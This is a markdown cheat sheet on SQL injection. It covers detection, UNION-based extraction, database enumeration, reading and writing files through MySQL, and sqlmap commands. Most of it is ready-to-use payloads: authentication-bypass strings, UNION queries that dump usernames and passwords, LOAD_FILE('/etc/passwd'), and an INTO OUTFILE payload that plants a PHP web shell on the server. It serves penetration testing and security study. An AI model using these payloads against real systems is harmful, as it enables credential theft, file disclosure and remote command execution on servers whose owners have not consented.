# SQL Injection

- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with
 the queries that an application makes to its database.
- Attackers can exploit SQLi to access and read sensitive information from the database, such as 
 user credentials, personal data, and financial records.
- In certain scenarios, SQLi can be leveraged to gain shell access to the server, enabling the
 attacker to execute arbitrary commands, escalate privileges, and potentially take full control
 of the server.
- It can occur in different parts of query:  
  1. `UPDATE`: Within value or WHERE clause  
  2. `INSERT`: Within values  
  3. `SELECT`: Within table name, column name, and ORDER BY clause.  

## Detection

- The single quote character `'` is often used in SQLi attacks. Look for errors or anomalies
 triggered by it.
- Look for differences in application responses when injecting some SQL-specific syntax.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, which help identify successful injections
 based on different responses.
- Payloads designed to trigger time delays when executed within a SQL query, such as `SLEEP()` 
or `WAITFOR DELAY`. Monitor any delay in the application response.
- Out-of-band (OAST) payloads trigger a network interaction when executed within a SQL query. 
Monitor for any external interactions, such as DNS requests.

```shell
# Basic payload that always returns true
' OR '1'='1
" OR "1"="1
' OR '1'='1' #
" OR "1"="1" #
# Injection with a comment to ignore the rest of the query
' OR 1=1--
" OR 1=1--
```

## Exploitation

### 1. Retrieving Hidden Data
SQL injections can be used to reveal hidden or sensitive data that would otherwise not be
 visible to the user.

```shell
# Lets say the query is:
# SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Gifts'--
# This payload comment the `AND released = 1` and all products
# will be visible even if they are not released.
```

### 2. Subverting Application Logic
SQL injections can also bypass authentication and authorization mechanisms, giving attackers 
control over the application logic.

```python
# Also check those above in detection section
admin' --
admin" --
```

### 3. UNION Injection
Union-based SQL injection allows attackers to combine the results of multiple queries,
 which can be used to extract data from different tables.

```python
# Check the number of columns in the table 
# (adjust the number to test for error responses)
' ORDER BY 1-- 
' UNION SELECT NULL--
# Attempts to find the number of columns in the query result
# as they must be same for both queries
' UNION SELECT 'a',NULL,NULL,NULL--
# Retrieves table names in result
' UNION select 1,database(),2,3-- -
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
' UNION SELECT table_name, TABLE_SCHEMA, NULL, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='table_name'--
' UNION SELECT version(), NULL, NULL, NULL--
# Retrieves usernames and passwords in a single result
' UNION SELECT username || '~' || password FROM users--
```

### 4. Database Enumeration
```shell
# Use these with UNION queries if needed
# MySQL Fingerprinting
# These commands will through error in other DBs
SELECT @@version
SELECT POW(1,1) # expected output is 1
SELECT SLEEP(5)

# Getting information about Database users and tables
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

### 5. Reading Files
- In MySQL, the DB user must have the `FILE` privilege to load a file's content into a table
 and then dump data from that table and read it.

```shell
# Use these with UNION queries if needed
# Getting DB user information
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
# checking if we have super user privileges
SELECT super_priv FROM mysql.user
# Dumping other privileges user may have
SELECT grantee, privilege_type FROM information_schema.user_privileges
```

- If you have `FILE` privilege, you can use this query to load file:

```shell
SELECT LOAD_FILE('/etc/passwd');
```

### 6. Writing Files
- Modern DBMSes disable file-write by default and require certain privileges for
DataBase Administrators to write files.
- To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable `not enabled`
3. Write access to the location we want to write to on the server

```python
Note: The secure_file_priv variable is used to determine where
to read/write files from.
- An empty value lets us read files from the entire file system. 
- If a certain directory is set, we can only read from the folder 
specified by the variable.
- NULL means we cannot read/write from any directory.

- MariaDB has this variable set to empty by default
- MySQL uses /var/lib/mysql-files as the default folder.
```

```shell
SHOW VARIABLES LIKE 'secure_file_priv';
# If using UNION injection
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

- Writing data into files:

```shell
# Writing tables data into file
SELECT * from users INTO OUTFILE 'users.txt';
# Writing strings directly to file
SELECT 'this is a file' INTO OUTFILE 'file.txt';
# Note: Use 'FROM_BASE64("base64_data")' function in order to
# be able to write long files, including binary data.
```
```python
Note: To write a web shell, we must know the base web directory for the web server.
One way to find it is to use load_file to read the server configuration
- Apache's configuration found at /etc/apache2/apache2.conf
- Nginx's configuration at /etc/nginx/nginx.conf
- IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config
- Use wordlists: 
  linux: seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
  windows: seclists/Discovery/Web-Content/default-web-root-directory-windows.txt
- If none of the above works, we can use server errors displayed to us and try to
 find the web directory that way.
```

- Writing Web Shell:

```shell
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

## Using SQLMap For Exploitation

```shell
# Attacking GET request
sqlmap -u "<target_domain>/vuln.php?id=1" --batch
# Attacking POST request
sqlmap '<target_domain>' --data 'uid=1&name=test'
# Specify parameter to inject
sqlmap '<target_domain>' --data 'uid=1&name=test' -p uid
sqlmap '<target_domain>' --data 'uid=1*&name=test'
# Changing request method
sqlmap -u '<target_domain>' --data='id=1' --method PUT
# Passing full HTTP request
sqlmap -r req.txt
# Custom headers
sqlmap '<target_domain>' --data 'uid=1&name=test' --cookie='PHPSESSID=abc'
sqlmap '<target_domain>' --data 'uid=1&name=test' -H='Cookie:PHPSESSID=abc'

# Other options
--parse-errors # Displays errors as part of the program run
-t logs.txt # Stores results in file
--proxy # To use a proxy
--batch # Make decisions without user interaction
--level (1-5, default 1) # Expectancy of success
--risk (1-3, default 1) # Risk of causing problems
```
- Where usage of OR payloads is a must (e.g., in case of login pages), we may have to raise
 the risk level ourselves because OR payloads are dangerous in a default run.